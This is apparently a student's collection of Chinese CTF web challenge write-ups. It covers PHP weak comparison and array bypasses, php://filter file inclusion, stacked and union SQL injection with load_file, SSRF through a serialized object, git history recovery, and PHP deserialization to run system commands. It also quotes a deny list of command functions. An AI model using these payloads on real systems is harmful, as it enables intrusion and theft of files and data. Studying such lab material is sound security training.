# Web

## [鹤城杯 2021]Middle magic

>做题人：郑林均
>url链接：https:\www.nssctf.cn\problem\464
>知识点：弱比较，数组绕过

一段很长的源代码，一步一步分析
```php
<?php
highlight_file(__FILE__);
include ".\flag.php";
include ".\result.php";
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){

    $aaa = preg_replace('\^(.*)level(.*)$\', '${1}<!-- filtered -->${2}', $_GET['aaa']);

    if(preg_match('\pass_the_level_1#\', $aaa)){
        echo "here is level 2";
        
        if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {
            if ($_POST['admin'] == $_POST['root_pwd'])
                echo '<p>The level 2 can not pass!<\p>';
        \ START FORM PROCESSING    
            else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){
                echo "here is level 3,do you kown how to overcome it?";
                if (isset($_POST['level_3'])) {
                    $level_3 = json_decode($_POST['level_3']);
                    
                    if ($level_3->result == $result) {
                        
                        echo "success:".$flag;
                    }
                    else {
                        echo "you never beat me!";
                    }
                }
                else{
                    echo "out";
                }
            }
            else{
                
                die("no");
            }
        \ perform validations on the form data
        }
        else{
            echo '<p>out!<\p>';
        }

    }
    
    else{
        echo 'nonono!';
    }

    echo '<hr>';
} 
```
先看第一关
```php
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){

    $aaa = preg_replace('\^(.*)level(.*)$\', '${1}<!-- filtered -->${2}', $_GET['aaa']);

    if(preg_match('\pass_the_level_1#\', $aaa)){
        echo "here is level 2";
```
因为该正则表达式有缺陷,^和$界定必须在同一行，而.并不能匹配换行符，所以这一关可以用%0a进行绕过，但是有问题，这样构造输出的还是nonono，查询发现如果直接传入#的话，#代表网页中的一个位置。其右面的字符，就是该位置的标识符，只有将#转码为%23，浏览器才会将其作为实义字符处理。
所以构造?aaa=%apass_the_level_1%23
来到第二关
```php
  if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {
            if ($_POST['admin'] == $_POST['root_pwd'])
                echo '<p>The level 2 can not pass!<\p>';
        \ START FORM PROCESSING    
            else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){
                echo "here is level 3,do you kown how to overcome it?";
```
我们需要POST两个变量，admin和root_pwd。要求两个变量不能弱相等并且两个变量的sha1值强相等。
我们可以sha1强碰撞或者数组绕过。这里直接用数值绕过，构造：admin[]=1&root_pwd[]=2,接下来就是第三关了
```php
if (isset($_POST['level_3'])) {
                    $level_3 = json_decode($_POST['level_3']);
                    
                    if ($level_3->result == $result) {
                        
                        echo "success:".$flag;
                    }
```
要求POSTlevel_3使其弱比较和result弱相等，要求格式为json形式，对于一个json类型的字符串，会解密成一个数组；存在一个0=="efeaf"的Bypass缺陷”，所以可以直接构造level_3={"result":0}
得到flag



## [BSidesCF 2020]Had a bad day

![alt text](image-8.png)

点击一个发现会有category参数，有可能是伪协议，也可能是sql，先试一下伪协议
?category=php:\filter\convert.base64-encode\resource=index.php,发现不能访问，尝试把php去掉，得到代码
```
<?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```
发现只能访问这三个文件，而strops函数是用于查找一个字符串在另一个字符串中第一次出现的位置，所以我们必需输入woofers，mewers，index中一个， 这里是存在一个php特性，当我们在进行伪协议写入的时候，php会忽略没有含义的值。这样绕过了过滤。从而可以达到读取flag的目的，可以参考：https:\blog.51cto.com\u_15061934\4520192
也就是说当我们通过category去传入文件名的时候，category=woofers\flag的时候，index.php会在参数后面直接连接.php这个后缀，因此$file=woofers\flag.php，而在php中进行文件包含的时候会把woofers\给忽略掉，找到这个有意义的flag.php，从而到达利用php伪协议去读取flag.php的目的。所以可以试着传入category的参数为woofers\flag，但还是没有被读出来，看了wp才知道php有套协议
```
payload:         category=php:\filter\convert.base64-encode\woofers\resource=flag

这个伪协议套协议也就是去寻找woofers\flag，而前面说到php会忽略woofers所以这里就可以绕过index.php的过滤，从而读取到flag了

```

## [GYCTF2020]Blacklist 1详解（handler命令用法!)
>做题人：郑林均
>url链接：[[GYCTF2020]Blacklist](https:\buuoj.cn\challenges#[GYCTF2020]Blacklist)

![alt text](image-4.png)
可以发现是字符注入，
首先尝试堆叠注入
```
1';show databases#
```
发现有显示

![alt text](image-5.png)
继续查表名

>1';show tables#
![image-6.png](image-6.png)

发现FlagHere数据表，其中很有可能有flag
查字段数

![image-7.png](image-7.png)

>1'order by 3#



>1'order by 2#
发现字段数为2 
查FlagHere数据表的字段名



>1';show columns from words #

查words的字段名

输入rename发现有过滤
```php
return preg_match("\set|prepare|er|rename|select|update|delete|drop|insert|where|\.\i",$inject);
```
把rename和er、select都过滤了
handler命令查询规则

>handler table_name open;handler table_name read first;handler table_name close;
___
>handler table_name open;handler table_name read next;handler table_name close;

如何理解？

>首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。
首先打开数据库，开始循环读取，读取成功后进行关闭操作。

构造payload

>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;
1';handler FlagHere open;handler FlagHere read next;handler FlagHere close;


## [ZJCTF 2019]NiZhuanSiWei

>做题人：郑林均
>url链接：[NiZhuanSiWei](https:\www.nssctf.cn\problem\22)
>知识点：php伪协议

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."<\h1><\br>";
    if(preg_match("\flag\",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  \useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```
分析代码可知首先我们要利用伪协议传入welcome to the zjctf到text上，所以构造
```
!?text=data:\text\plain,welcome to the zjctf
```
来到下个页面

又因为之前提醒了又useless.php，所以现在用伪协议构造尝试访问一下
```
&file=php:\filter\read=convert.base64-encode\resource=useless.php
```
出现一段编码
```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```
用base64解码得到一段php代码
```php
<?php  

class Flag{  \flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !\COME ON PLZ");
        }  
    }  
}  
?>  

```
有点看不懂，看wp说接下来是构造poc，但我不是很懂怎么构造，和前辈借一下
```
<?php  
 
class Flag{  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !\COME ON PLZ");
        }  
    }  
}  
$password = new Flag();
echo serialize($password);
?> 
```
输出
```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```
构造
```
&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

## [NCTF 2018]全球最大交友网站
知识点：git泄漏

![alt text](image-26.png)
下载a.zip发现有git文件，猜想可能是git泄漏

![alt text](image-25.png)
![alt text](image-27.png)
打开发现Allsource files areingit tag1.0
提示我们真正的源码在tag == 1.0的commit
![](image-28.png)
git log查看历史版本
因为git版本更新啥的以前的flag文件可能就无了，而我们可以利用git reset命令查看git版本变化时每次提交的commit修改值查看修改的文件然后来回溯到对应版本，这里flag应该在最老的版本
```bash
git reset --hard 02b7f44320ac0ec69e954ab39f627b1e13d1d362
```

## [网鼎杯 2018]Fakebook

>知识点：sql注入

首先用dirsearch扫了一些，发现有robots.txt文件
/user.php.bak
下载下来发现php代码
```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
有一个UserInfo的类,类中有三个公共的类变量：name,age,blog。一个构造方法，一个get方法。主要的工作应该是建立会话，

然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，一个getBlogContents方法，返回一个url的内容

还有一个isValidBlog验证这是否是一个有效的blog地址，看大佬博客说，这段正则好像url中有.就可以匹配。

get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点思路了，而我们在御剑扫到了flag.php。猜测可能flag.php处于内网，

如果用ssrf访问flag.php，可以用伪协议file://var/www/html/flag.php访问。
![alt text](image-29.png)
发现有no这个注入点
?no=1 and 1=1 时回显正常
?no=1 and 1=2 时回显错误
可以确定是sql注入并且是数字型
?no = 1 order by 3　　　　正常

?no = 1 order by 4　　　　正常

?no = 1 order by 5　     错误
有四列
结果有这么一段话，被发现了。

然后，通过大佬wp中发现，过滤了union select

可以用过union/**/select绕过

于是我们再次构造payload:

?no = -1 union/**/select 1,2,3,4--+
![alt text](image-30.png)
回显位是username,然后还发现了一下错误信息，/var/www/html/view.php刚才扫目录得知flag.php也在这个目录中。
```bash
-1 union/**/select 1,database(),3,4--+
```
![alt text](image-31.png)

```
-1 union/**/select 1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like'fakebook'),3,4--+
```
查到user
```bash
 ?no=-1 union/**/select 1,user(),3,4--+　　　　//数据库信息
 ```
 ![alt text](image-32.png)
 发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下

load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件
```bash
?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+
```
这样就得到flag了
但我们还是继续用sql方法
```bash
-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'--+
```
![alt text](image-33.png)
```bash
-1 union/**/select 1,group_concat(data),3,4 from users--+
```
O:8:"UserInfo":3:{s:4:"name";s:4:"yuji";s:3:"age";i:12;s:4:"blog";s:7:"12.blog";} 
这个是序列化后的UserInfo，这就与我们下载的文件有关了，因为之前的php代码过滤的并不严谨，只要有.就行，就可以构造
```bash
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

## [网鼎杯 2020 朱雀组]phpweb
页面的话翻译过来就是
警告：依赖系统的时区设置是不安全的。您​​必须​​使用 date.timezone配置项或 date_default_timezone_set()函数。如果您使用了上述方法中的任何一种，但仍然收到此警告，那么您很可能拼写错了时区标识符。我们目前选择了 'UTC' 时区，但请您设置 date.timezone来指定您的时区
。不是很理解，用bp抓包看看
![alt text](image-34.png)
发现有func和p参数
我们尝试猜测这两个参数的关系，可以用最简单的 php函数 MD5 来进行检测
![alt text](image-35.png)
发先页面回显的内容就是MD5加密后的123
尝试 直接查看网站页面看能否成功
![alt text](image-36.png)
发现被过滤了，就要考虑其他函数了
在这里我们可以使用多种函数进行查看 例如：file_get_contents、highlight_file() ，show_source()等

    file_get_contents(path):读取path路径下文件的内容
```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
    这里就可以用反序列化了

```php

    <?php
  class Test{
     var p="ls /";
     var func="system";
     }
     <?php
$a=new Test();
echo serialize($a);
?>
```
![alt text](image-37.png)
没有flag
system(“find / -name flag”)：查找所有文件名匹配flag的文件
![alt text](image-38.png)
直接读取flag
```bash
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```